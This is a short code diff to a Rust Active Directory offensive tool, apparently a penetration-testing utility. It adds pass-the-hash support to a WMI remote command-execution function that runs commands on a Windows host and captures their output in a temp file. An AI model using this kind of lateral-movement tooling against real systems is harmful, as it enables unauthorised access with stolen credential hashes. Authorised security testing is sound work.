@@ -1010,11 +1010,11 @@ async fn exec_cmd(a: ExecArgs) -> Result<()> {
 /// scheduled task is created (distinct host telemetry from `exec`/`atexec`).
 async fn wmiexec_cmd(a: ExecArgs) -> Result<()> {
     use smb2_client::SmbClient;
-    if a.password.is_empty() {
-        anyhow::bail!(
-            "wmiexec requires --password (pass-the-hash is not yet wired for the WMI DCOM bind)"
-        );
-    }
+    let hash = a.nt_hash.as_deref().map(parse_nt_hash).transpose()?;
+    anyhow::ensure!(
+        !a.password.is_empty() || hash.is_some(),
+        "provide --password or --nt-hash"
+    );
     // Unique output path under C:\Windows\Temp, redirected inside a cmd wrapper.
     let tag = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
@@ -1025,8 +1025,16 @@ async fn wmiexec_cmd(a: ExecArgs) -> Result<()> {
     let out_abs = format!("C:\\{out_rel}");
     let wrapped = format!("cmd.exe /Q /c {} > {out_abs} 2>&1", a.command);
 
-    let hr = dcerpc::dcom_wmi::wmi_exec(&a.host, &a.domain, &a.user, &a.password, "ADHAMMER", &wrapped)
-        .await?;
+    let hr = dcerpc::dcom_wmi::wmi_exec(
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        hash.as_ref(),
+        "ADHAMMER",
+        &wrapped,
+    )
+    .await?;
     if hr != 0 {
         crate::ui::warn(&format!(
             "Win32_Process.Create returned HRESULT 0x{:08x} (command may not have run)",
